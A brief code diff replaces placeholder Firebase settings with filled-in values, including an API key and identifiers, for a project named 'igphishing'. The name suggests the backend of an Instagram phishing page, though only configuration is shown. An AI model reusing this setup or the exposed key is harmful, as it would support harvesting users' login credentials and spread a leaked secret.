@@ -3,15 +3,15 @@
 
 ///Edit Under This only
 
-var firebaseConfig = {
-  apiKey: "api-key",
-  authDomain: "project-id.firebaseapp.com",
-  databaseURL: "https://project-id.firebaseio.com",
-  projectId: "project-id",
-  storageBucket: "project-id.appspot.com",
-  messagingSenderId: "sender-id",
-  appId: "app-id",
-  measurementId: "G-measurement-id",
+const firebaseConfig = {
+  apiKey: "AIzaSyCFXiZpJx3nLQqGUkNdjWXMw9SLUIPj3uU",
+  authDomain: "igphishing.firebaseapp.com",
+  databaseURL: "https://igphishing.firebaseio.com",
+  projectId: "igphishing",
+  storageBucket: "igphishing.appspot.com",
+  messagingSenderId: "822589058510",
+  appId: "1:822589058510:web:1c0272a99a6ce86f45cf9f",
+  measurementId: "G-4LXM2KKD83"
 };
 
      
